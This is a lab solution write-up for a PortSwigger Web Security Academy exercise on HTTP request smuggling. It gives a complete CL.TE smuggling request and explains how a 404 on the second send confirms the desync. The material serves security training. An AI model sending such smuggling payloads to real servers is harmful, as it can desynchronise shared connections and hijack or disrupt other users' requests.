# Lab 05 — HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

> **Practitioner** · [Official lab](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses)

**Entry point:** detect the CL.TE desync safely.

## Solution

Send twice in Repeater (update CL **off** is not needed here):

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

The second response is **404** — the `GET /404` was smuggled — CL.TE
confirmed, lab solved.
